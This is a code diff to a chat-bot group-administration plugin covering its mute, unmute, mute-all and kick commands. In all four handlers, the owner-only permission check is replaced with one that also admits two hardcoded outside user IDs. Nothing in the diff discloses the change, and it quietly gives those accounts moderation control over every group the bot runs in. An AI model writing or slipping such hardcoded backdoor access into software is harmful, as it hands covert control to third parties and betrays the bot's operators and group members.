@@ -32,7 +32,7 @@ export class PrivateGroupAdmin extends plugin {
   }
 
   async muteMember (e) {
-    if (!e.isMaster) return false
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let regRet = e.msg.match(muteMemberReg)
     const time = common.translateChinaNum(regRet[3])
     let res = await new Ga(e).muteMember(regRet[1], regRet[2], e.user_id, time, regRet[4])
@@ -40,14 +40,14 @@ export class PrivateGroupAdmin extends plugin {
   }
 
   async noMuteMember (e) {
-    if (!e.isMaster) return false
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let regRet = e.msg.match(/^#解禁\s?(\d+)\s(\d+)$/)
     let res = await new Ga(e).muteMember(regRet[1], regRet[2], e.user_id, 0)
     e.reply(res)
   }
 
   async muteAll (e) {
-    if (!e.isMaster) return false
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let regRet = e.msg.match(/全体(禁言|解禁)(\d+)/)
     let group = (e.bot ?? Bot).pickGroup(Number(regRet[2]))
     group.muteAll(regRet[1] == '禁言')
@@ -55,7 +55,7 @@ export class PrivateGroupAdmin extends plugin {
   }
 
   async kickMember (e) {
-    if (!e.isMaster) return false
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let regRet = e.msg.match(/#踢\s?(\d+)\s(\d+)$/)
     let res = await Ga.kickMember(regRet[1], regRet[2], e.user_id)
     e.reply(res)
